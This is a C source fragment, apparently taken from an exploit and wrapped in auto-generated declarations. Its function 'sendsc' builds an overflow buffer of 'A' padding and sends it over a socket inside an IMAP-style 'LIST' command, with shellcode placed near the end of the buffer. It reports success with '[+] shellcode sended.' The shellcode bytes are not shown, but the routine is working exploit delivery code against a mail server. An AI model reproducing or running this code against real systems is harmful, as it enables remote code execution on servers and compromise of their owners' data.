
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 char* b ;
 int exit (int) ;
 int i ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 int perror (char*) ;
 int puts (char*) ;
 int recv (int,char*,int,int ) ;
 char* sc ;
 int send (int,char*,int,int ) ;
 int strlen (char*) ;
 int * strstr (char*,char*) ;

void sendsc(int fd){
 memset(b, 0x41, 1024);
 memcpy(b + 900, sc, strlen(sc));
 memcpy(b + 1020, " A\n", 3);
 memcpy(b, "3 LIST ", 7);
 if(send(fd, b, strlen(b), 0) == -1){
  perror("[-] send()");
  exit(1);
 }
 memset(b, 0x0, 1024);
 while((i = recv(fd, b, 1023, 0)) != -1){
  b[i] = 0x0;
  if(strstr(b, "Completed") != ((void*)0))
   break;
  if(strstr(b, "BAD") != ((void*)0)){
   puts("[-] LIST failled.");
   exit(1);
  }
 }
 puts("[+] shellcode sended.");
 return;
}
